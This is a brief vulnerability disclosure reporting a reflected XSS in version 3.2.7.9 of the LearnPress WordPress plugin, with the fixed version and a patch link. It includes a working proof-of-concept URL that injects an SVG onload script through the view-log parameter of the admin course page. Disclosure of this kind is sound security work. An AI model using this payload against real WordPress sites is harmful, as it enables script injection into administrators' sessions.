# wpp_LearnPress

the Wordpress Plugin learnpress has a reflected XSS.


Details:
* Plugin: https://wordpress.org/plugins/learnpress/
* Vulnerable Version: 3.2.7.9
* Payload: http://127.0.0.1/wordpress/wp-admin/edit.php?post_type=lp_course&view-log=aaa%22%3Csvg/onload=%22alert(1)%22/%3E
![unnamed](https://user-images.githubusercontent.com/32059182/98671966-028d2780-2390-11eb-90b7-06d986a650a4.png)
And the issue in the file: ./learnpress/learnpress.php: 
![image](https://user-images.githubusercontent.com/32059182/98671944-f99c5600-238f-11eb-97d8-5b80657ec34b.png)
the variable $log output without sanitize.


Fix:
* Fix Version: 3.2.8
* patch: https://plugins.trac.wordpress.org/changeset?old_path=%2Flearnpress&old=2413726&new_path=%2Flearnpress&new=2413726&sfp_email=&sfph_mail=

Thank you~
